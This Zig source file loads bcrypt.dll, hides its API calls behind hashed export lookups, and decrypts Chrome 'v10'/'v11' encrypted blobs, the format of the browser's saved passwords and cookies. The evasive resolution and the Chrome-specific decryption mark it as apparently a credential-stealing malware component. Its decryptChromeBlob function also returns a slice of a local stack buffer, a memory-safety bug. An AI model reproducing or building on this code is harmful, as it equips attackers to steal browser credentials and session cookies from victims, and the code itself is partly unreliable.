const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const export_resolve = @import("../types/export_resolve.zig");
const dll_loader = @import("dll_loader.zig");

const NTSTATUS = i32;

const BCryptOpenAlgorithmProvider = *const fn (
    phAlgorithm: *types.PVOID,
    pszAlgId: *const u16,
    pszImplementation: *const u16,
    dwFlags: u32,
) callconv(.c) NTSTATUS;

const BCryptCloseAlgorithmProvider = *const fn (
    hAlgorithm: types.PVOID,
    dwFlags: u32,
) callconv(.c) NTSTATUS;

const BCryptSetProperty = *const fn (
    hObject: types.PVOID,
    pszProperty: *const u16,
    pbInput: *const u8,
    cbInput: u32,
    dwFlags: u32,
) callconv(.c) NTSTATUS;

const BCryptGenerateSymmetricKey = *const fn (
    phKey: *types.PVOID,
    hAlgorithm: types.PVOID,
    pbKeyObject: ?*u8,
    cbKeyObject: u32,
    pbSecret: *const u8,
    cbSecret: u32,
    dwFlags: u32,
) callconv(.c) NTSTATUS;

const BCryptDestroyKey = *const fn (
    hKey: types.PVOID,
) callconv(.c) NTSTATUS;

const BCryptDecrypt = *const fn (
    hKey: types.PVOID,
    pbInput: *const u8,
    cbInput: u32,
    pPaddingInfo: ?*const anyopaque,
    pbIV: ?*u8,
    cbIV: u32,
    pbOutput: ?*u8,
    cbOutput: u32,
    pcbResult: *u32,
    dwFlags: u32,
) callconv(.c) NTSTATUS;

const BCRYPT_AUTH_MODE_CHAIN_CALL_FLAG: u32 = 0x00000001;
const BCRYPT_AUTH_MODE_IN_PROGRESS_FLAG: u32 = 0x00000002;

const BCRYPT_AUTH_TAG_LENGTH: [25]u16 = .{ 'A', 'u', 't', 'h', 'T', 'a', 'g', 'L', 'e', 'n', 'g', 't', 'h', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };

fn toWide(comptime s: []const u8) [s.len:0]u16 {
    comptime {
        var buf: [s.len:0]u16 = undefined;
        for (s, 0..) |c, i| {
            buf[i] = c;
        }
        buf[s.len] = 0;
        return buf;
    }
}

const BCRYPT_AES_ALGORITHM = toWide("AES");
const BCRYPT_CHAINING_MODE_GCM = toWide("ChainingModeGCM");
const BCRYPT_CHAINING_MODE = toWide("ChainingMode");

const BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION: u32 = 1;

const AuthenticatedCipherModeInfo = extern struct {
    cbSize: u32,
    dwInfoVersion: u32,
    pbNonce: ?*u8,
    cbNonce: u32,
    pbAuthData: ?*const u8,
    cbAuthData: u32,
    pbTag: ?*u8,
    cbTag: u32,
    pbMacContext: ?*u8,
    cbMacContext: u32,
    dwFlags: u32,
    cbReserved: u32,
};

var g_bcrypt_base: types.PVOID = @as(types.PVOID, @ptrFromInt(@as(usize, 1)));
var g_bcrypt_open: ?BCryptOpenAlgorithmProvider = null;
var g_bcrypt_close: ?BCryptCloseAlgorithmProvider = null;
var g_bcrypt_set_prop: ?BCryptSetProperty = null;
var g_bcrypt_gen_key: ?BCryptGenerateSymmetricKey = null;
var g_bcrypt_destroy_key: ?BCryptDestroyKey = null;
var g_bcrypt_decrypt: ?BCryptDecrypt = null;

fn ensureInit() bool {
    if (@intFromPtr(g_bcrypt_base) != 1) return true;
    g_bcrypt_base = dll_loader.getOrLoadDll("bcrypt.dll") orelse return false;

    const resolveFunc = export_resolve.getFunctionByHash;
    const B = g_bcrypt_base;

    g_bcrypt_open = @ptrCast(@alignCast(resolveFunc(B, hash.encryptedHashFunc("BCryptOpenAlgorithmProvider")) orelse return false));
    g_bcrypt_close = @ptrCast(@alignCast(resolveFunc(B, hash.encryptedHashFunc("BCryptCloseAlgorithmProvider")) orelse return false));
    g_bcrypt_set_prop = @ptrCast(@alignCast(resolveFunc(B, hash.encryptedHashFunc("BCryptSetProperty")) orelse return false));
    g_bcrypt_gen_key = @ptrCast(@alignCast(resolveFunc(B, hash.encryptedHashFunc("BCryptGenerateSymmetricKey")) orelse return false));
    g_bcrypt_destroy_key = @ptrCast(@alignCast(resolveFunc(B, hash.encryptedHashFunc("BCryptDestroyKey")) orelse return false));
    g_bcrypt_decrypt = @ptrCast(@alignCast(resolveFunc(B, hash.encryptedHashFunc("BCryptDecrypt")) orelse return false));
    return true;
}

pub fn isAvailable() bool {
    return ensureInit();
}

pub fn decrypt(
    ciphertext: []const u8,
    key: [32]u8,
    nonce: [12]u8,
    tag: [16]u8,
    aad: []const u8,
    out: []u8,
) ![]u8 {
    if (!ensureInit()) return error.BCryptNotAvailable;
    if (out.len < ciphertext.len) return error.OutputTooSmall;

    const null_str: ?*const u16 = null;
    const null_str_opt: *const u16 = @ptrCast(@alignCast(null_str));
    var hAlgo: types.PVOID = undefined;
    var status = g_bcrypt_open.?( &hAlgo, &BCRYPT_AES_ALGORITHM, null_str_opt, 0);
    if (status < 0) return error.BCryptOpenFailed;
    errdefer _ = g_bcrypt_close.?(hAlgo, 0);

    const chaining_mode_ptr: *const u8 = @ptrCast(&BCRYPT_CHAINING_MODE_GCM);
    status = g_bcrypt_set_prop.?(hAlgo, &BCRYPT_CHAINING_MODE, chaining_mode_ptr, @sizeOf(@TypeOf(BCRYPT_CHAINING_MODE_GCM)), 0);
    if (status < 0) return error.BCryptSetChainingFailed;

    var hKey: types.PVOID = undefined;
    status = g_bcrypt_gen_key.?( &hKey, hAlgo, null, 0, @as(*const u8, @ptrCast(&key)), 32, 0);
    if (status < 0) return error.BCryptKeyImportFailed;
    errdefer _ = g_bcrypt_destroy_key.?(hKey);

    var auth_info = AuthenticatedCipherModeInfo{
        .cbSize = @sizeOf(AuthenticatedCipherModeInfo),
        .dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION,
        .pbNonce = @constCast(@as(*const u8, @ptrCast(nonce[0..].ptr))),
        .cbNonce = 12,
        .pbAuthData = if (aad.len > 0) @as(?*const u8, @ptrCast(aad.ptr)) else null,
        .cbAuthData = @as(u32, @intCast(aad.len)),
        .pbTag = @constCast(@as(*const u8, @ptrCast(tag[0..].ptr))),
        .cbTag = 16,
        .pbMacContext = null,
        .cbMacContext = 0,
        .dwFlags = 0,
        .cbReserved = 0,
    };

    var result_len: u32 = 0;
    status = g_bcrypt_decrypt.?(
        hKey,
        @as(*const u8, @ptrCast(ciphertext.ptr)),
        @as(u32, @intCast(ciphertext.len)),
        @as(?*const anyopaque, @ptrCast(&auth_info)),
        null,
        0,
        @as(?*u8, @ptrCast(out.ptr)),
        @as(u32, @intCast(out.len)),
        &result_len,
        0,
    );
    if (status < 0) return error.BCryptDecryptFailed;

    return out[0..result_len];
}

pub fn decryptChromeBlob(encrypted: []const u8, key: [32]u8) ![]u8 {
    const min_len = 3 + 12 + 16;
    if (encrypted.len < min_len) return error.InvalidBlob;
    if (!std.mem.eql(u8, encrypted[0..3], "v10") and !std.mem.eql(u8, encrypted[0..3], "v11")) return error.NotChromeBlob;

    const nonce = encrypted[3..15];
    const ciphertext = encrypted[15 .. encrypted.len - 16];
    const tag = encrypted[encrypted.len - 16 ..];

    var nonce_arr: [12]u8 = undefined;
    var tag_arr: [16]u8 = undefined;
    @memcpy(&nonce_arr, nonce);
    @memcpy(&tag_arr, tag);

    var out: [2048]u8 = undefined;
    return decrypt(ciphertext, key, nonce_arr, tag_arr, "", &out);
}
